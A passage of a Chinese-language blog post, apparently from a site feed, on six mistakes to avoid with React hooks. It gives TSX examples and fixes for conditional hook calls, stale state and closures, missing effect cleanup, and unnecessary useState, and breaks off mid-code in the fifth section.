      <title>React Hooks 使用时要避免的6个错误</title>
      <link href="/2023/08/25/frontend/react/react-hooks-shi-yong-shi-yao-bi-mian-de-6-ge-cuo-wu/"/>
      <url>/2023/08/25/frontend/react/react-hooks-shi-yong-shi-yao-bi-mian-de-6-ge-cuo-wu/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p>今天来看看在使用 React hooks 时的一些坑，以及如何避开这些坑。</p><p><strong>问题概览：</strong></p><ol><li>不要改变 hooks 的调用顺序；</li><li>不要使用旧的状态；</li><li>不要创建旧的闭包；</li><li>不要忘记清理副作用；</li><li>不要在不需要重新渲染时使用 useState；</li><li>不要缺少 useEffect 依赖。</li></ol><p><a name="XNSpj"></a></p><h2 id="1-不要改变-hooks-的调用顺序"><a href="#1-不要改变-hooks-的调用顺序" class="headerlink" title="1. 不要改变 hooks 的调用顺序 "></a>1. 不要改变 hooks 的调用顺序 <br /><br /></h2><p>下面先来看一个例子：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">FetchGame</span> = (<span class="params">&#123; id &#125;</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (!id) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;请选择一个游戏&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> [game, setGame] = <span class="title function_">useState</span>(&#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="attr">description</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="title function_">useEffect</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="title function_">fetchGame</span> = <span class="keyword">async</span> (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">      <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">`/api/game/<span class="subst">$&#123;id&#125;</span>`</span>);</span><br><span class="line">      <span class="keyword">const</span> fetchedGame = <span class="keyword">await</span> response.<span class="title function_">json</span>();</span><br><span class="line">      <span class="title function_">setGame</span>(fetchedGame);</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="title function_">fetchGame</span>();</span><br><span class="line">  &#125;, [id]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">div</span>&gt;</span>Name: &#123;game.name&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">div</span>&gt;</span>Description: &#123;game.description&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />这个组件接收一个参数 id，在<code>useEffect</code>中会使用这个 id 作为参数去请求游戏的信息。并将获取的数据保存在状态变量 game 中。</p><p>当组件执行时，会获取导数据并更新状态。但是这个组件有一个警告：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1637767909352-ca985d29-e8e5-4b28-a1be-7af2a168f6ff.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1637767909352-ca985d29-e8e5-4b28-a1be-7af2a168f6ff.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>这里是告诉我们，钩子的执行是不正确的。因为当 id 为空时，组件会提示，并直接退出。如果 id 存在，就会调用<code>useState</code>和<code>useEffect</code>这两个 hook。这样有条件的执行钩子时就可能会导致意外并且难以调试的错误。实际上，React hooks 内部的工作方式要求组件在渲染时，总是以相同的顺序来调用 hook。</p><p>这也就是 React 官方文档中所说的：<strong>不要在循环，条件或嵌套函数中调用 Hook， 确保总是在你的 React 函数的最顶层以及任何 return 之前调用他们。</strong></p><p>解决这个问题最直接的办法就是按照官方文档所说的，<strong>确保总是在你的 React 函数的最顶层以及任何 return 之前调用他们：</strong></p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">FetchGame</span> = (<span class="params">&#123; id &#125;</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> [game, setGame] = <span class="title function_">useState</span>(&#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="attr">description</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="title function_">useEffect</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="title function_">fetchGame</span> = <span class="keyword">async</span> (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">      <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">`/api/game/<span class="subst">$&#123;id&#125;</span>`</span>);</span><br><span class="line">      <span class="keyword">const</span> fetchedGame = <span class="keyword">await</span> response.<span class="title function_">json</span>();</span><br><span class="line">      <span class="title function_">setGame</span>(fetchedGame);</span><br><span class="line">    &#125;;</span><br><span class="line">    id &amp;&amp; <span class="title function_">fetchGame</span>();</span><br><span class="line">  &#125;, [id]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!id) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;请选择一个游戏&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">div</span>&gt;</span>Name: &#123;game.name&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">div</span>&gt;</span>Description: &#123;game.description&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样，无论传入的 id 是否为空，useState 和 useEffect 总会以相同的顺序来调用，这样就不会出错啦~</p><p>React 官方文档中的 Hook 规则：<a href="https://zh-hans.reactjs.org/docs/hooks-rules.html">《Hook 规则》</a>，可以使用插件<a href="https://www.npmjs.com/package/eslint-plugin-react-hooks">eslint-plugin-react-hooks</a>来帮助我们检查这些规则。</p><p><a name="UtmpH"></a></p><h2 id="2-不要使用旧的状态"><a href="#2-不要使用旧的状态" class="headerlink" title="2. 不要使用旧的状态"></a>2. 不要使用旧的状态</h2><p>先来看一个计数器的例子：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">Increaser</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> [count, setCount] = <span class="title function_">useState</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> increase = <span class="title function_">useCallback</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">setCount</span>(count + <span class="number">1</span>);</span><br><span class="line">  &#125;, [count]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">handleClick</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    <span class="title function_">increase</span>();</span><br><span class="line">    <span class="title function_">increase</span>();</span><br><span class="line">    <span class="title function_">increase</span>();</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;handleClick&#125;</span>&gt;</span>+<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">div</span>&gt;</span>Counter: &#123;count&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />这里的<code>handleClick</code>方法会在点击按钮后执行三次增加状态变量 count 的操作。那么点击一次是否会增加 3 呢？事实并非如此。点击按钮之后，count 只会增加 1。问题就在于，当我们点击按钮时，相当于下面的操作：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">handleClick</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="title function_">setCount</span>(count + <span class="number">1</span>);</span><br><span class="line">  <span class="title function_">setCount</span>(count + <span class="number">1</span>);</span><br><span class="line">  <span class="title function_">setCount</span>(count + <span class="number">1</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><br />当第一次调用<code>setCount(count + 1)</code>时是没有问题的，它会将<code>count</code>更新为 1。接下来第 2、3 次调用<code>setCount</code>时，<code>count</code>还是使用了旧的状态（<code>count</code>为 0），所以也会计算出<code>count</code>为 1。发生这种情况的原因就是状态变量会在下一次渲染才更新。</p><p>解决这个问题的办法就是，<strong>使用函数的方式来更新状态：</strong></p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">Increaser</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> [count, setCount] = <span class="title function_">useState</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> increase = <span class="title function_">useCallback</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">setCount</span>(<span class="function"><span class="params">count</span> =&gt;</span> count + <span class="number">1</span>);</span><br><span class="line">  &#125;, [count]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">handleClick</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    <span class="title function_">increase</span>();</span><br><span class="line">    <span class="title function_">increase</span>();</span><br><span class="line">    <span class="title function_">increase</span>();</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;handleClick&#125;</span>&gt;</span>+<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">div</span>&gt;</span>Counter: &#123;count&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />这样改完之后，React 就能拿到最新的值，当点击按钮时，就会每次增加 3。所以需要记住：<strong>如果要使用当前状态来计算下一个状态，就要使用函数的式方式来更新状态：</strong></p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">setValue</span>(<span class="function"><span class="params">prevValue</span> =&gt;</span> prevValue + someResult)</span><br></pre></td></tr></table></figure><p><a name="rEJ8M"></a></p><h2 id="3-不要创建旧的闭包"><a href="#3-不要创建旧的闭包" class="headerlink" title="3. 不要创建旧的闭包"></a>3. 不要创建旧的闭包</h2><p>众所周知，React Hooks 是依赖闭包实现的。当使用接收一个回调作为参数的钩子时，比如：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">useEffect</span>(callback, deps)</span><br><span class="line"><span class="title function_">useCallback</span>(callback, deps)</span><br></pre></td></tr></table></figure><p><br />此时，我们就可能会创建一个旧的闭包，该闭包会捕获过时的状态或者 prop 变量。这么说可能有些抽象，下面来看一个例子，这个例子中，useEffect 每 2 秒会打印一次 count 的值：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">WatchCount</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> [count, setCount] = <span class="title function_">useState</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="title function_">useEffect</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">setInterval</span>(<span class="keyword">function</span> <span class="title function_">log</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Count: <span class="subst">$&#123;count&#125;</span>`</span>);</span><br><span class="line">    &#125;, <span class="number">2000</span>);</span><br><span class="line">  &#125;, []);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">handleClick</span> = (<span class="params"></span>) =&gt; <span class="title function_">setCount</span>(<span class="function"><span class="params">count</span> =&gt;</span> count + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;handleClick&#125;</span>&gt;</span>+<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">div</span>&gt;</span>Count: &#123;count&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><br />最终的输出的结果如下：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1637770327315-7ccc9144-6324-4058-b88b-b32154d9f9f9.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1637770327315-7ccc9144-6324-4058-b88b-b32154d9f9f9.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>可以看到，每次打印的 count 值都是 0，和实际的 count 值并不一样。为什么会这样呢？</p><p>在第一次渲染时应该没啥问题，闭包 log 会将 count 打印出 0。从第二次开始，每次当点击按钮时，count 会增加 1，但是<code>setInterval</code>仍然调用的是从初次渲染中捕获的 count 为 0 的旧的 log 闭包。log 方法就是一个旧的闭包，因为它捕获的是一个过时的状态变量 count。</p><p>这里的解决方案就是，当 count 发生变化时，就重置定时器：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">WatchCount</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> [count, setCount] = <span class="title function_">useState</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="title function_">useEffect</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> id = <span class="built_in">setInterval</span>(<span class="keyword">function</span> <span class="title function_">log</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Count: <span class="subst">$&#123;count&#125;</span>`</span>);</span><br><span class="line">    &#125;, <span class="number">2000</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="function">() =&gt;</span> <span class="built_in">clearInterval</span>(id);</span><br><span class="line">  &#125;, [count]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">handleClick</span> = (<span class="params"></span>) =&gt; <span class="title function_">setCount</span>(<span class="function"><span class="params">count</span> =&gt;</span> count + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;handleClick&#125;</span>&gt;</span>+<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">div</span>&gt;</span>Count: &#123;count&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />这样，当状态变量 count 发生变化时，就会更新闭包。为了防止闭包捕获到旧值，就要确保在提供给 hook 的回调中使用的 prop 或者 state 都被指定为依赖性。<br><a name="KZEeQ"></a></p><h2 id="4-不要忘记清理副作用"><a href="#4-不要忘记清理副作用" class="headerlink" title="4. 不要忘记清理副作用"></a>4. 不要忘记清理副作用</h2><p>有很多副作用，比如<code>fetch</code>请求、<code>setTimeout</code>等都是异步的，如果不需要这些副作用或者组件在卸载时，不要忘记清理这些副作用。下面来看一个计数器的例子：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">DelayedIncreaser</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> [count, setCount] = <span class="title function_">useState</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">const</span> [increase, setShouldIncrease] = <span class="title function_">useState</span>(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">  <span class="title function_">useEffect</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (increase) &#123;</span><br><span class="line">      <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">setCount</span>(<span class="function"><span class="params">count</span> =&gt;</span> count + <span class="number">1</span>)</span><br><span class="line">      &#125;, <span class="number">1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;, [increase]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;()</span> =&gt;</span> setShouldIncrease(true)&#125;&gt;</span></span><br><span class="line"><span class="language-xml">        +</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">div</span>&gt;</span>Count: &#123;count&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">MyApp</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> [show, setShow] = <span class="title function_">useState</span>(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;&gt;</span></span></span><br><span class="line"><span class="language-xml">      &#123;show ? <span class="tag">&lt;<span class="name">DelayedIncreaser</span> /&gt;</span> : null&#125;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;()</span> =&gt;</span> setShow(false)&#125;&gt;卸载<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />这个组件很简单，就是在点击按钮时，状态变量 count 每秒会增加 1。当我们点击+按钮时，它会和我们预期的一样。但是当我们点击“卸载”按钮时，控制台就会出现警告：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1637771848266-87ad26c0-31a4-4b45-90f4-6f06fc8862d0.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1637771848266-87ad26c0-31a4-4b45-90f4-6f06fc8862d0.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>修复这个问题只需要使用 useEffect 来清理定时器即可：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">useEffect</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (increase) &#123;</span><br><span class="line">      <span class="keyword">const</span> id = <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">setCount</span>(<span class="function"><span class="params">count</span> =&gt;</span> count + <span class="number">1</span>)</span><br><span class="line">      &#125;, <span class="number">1000</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="function">() =&gt;</span> <span class="built_in">clearInterval</span>(id);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;, [increase]);</span><br></pre></td></tr></table></figure><p><br />当我们编写一些副作用时，我们需要知道这个副作用是否需要清除。</p><p><a name="dSjDO"></a></p><h2 id="5-不要在不需要重新渲染时使用-useState"><a href="#5-不要在不需要重新渲染时使用-useState" class="headerlink" title="5. 不要在不需要重新渲染时使用 useState"></a>5. 不要在不需要重新渲染时使用 useState</h2><p>在 React hooks 中，我们可以使用<code>useState</code> hook 来进行状态的管理。虽然使用起来比较简单，但是如果使用不恰当，就可能会出现意想不到的问题。来看下面的例子：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">Counter</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> [counter, setCounter] = <span class="title function_">useState</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">onClickCounter</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    <span class="title function_">setCounter</span>(<span class="function"><span class="params">counter</span> =&gt;</span> counter + <span class="number">1</span>);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">onClickCounterRequest</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    <span class="title function_">apiCall</span>(counter);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;onClickCounter&#125;</span>&gt;</span>Counter<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;onClickCounterRequest&#125;</span>&gt;</span>Counter Request<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />在上面的组件中，有两个按钮，第一个按钮会触发计数器加一，第二个按钮会根据当前的计数器状态发送一个请求。可以看到，状态变量<code>counter</code>并没有在渲染阶段使用。所以，每次点击第一个按钮时，都会有不需要的重新渲染。</p><p>因此，当遇到这种需要在组件中使用一个变量在渲染中保持其状态，并且不会触发重新渲染时，那么<code>useRef</code>会是一个更好的选择，下面来对上面的例子使用 useRef 进行改编：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">Counter</span> = (<span class="params"></span>) =&gt; 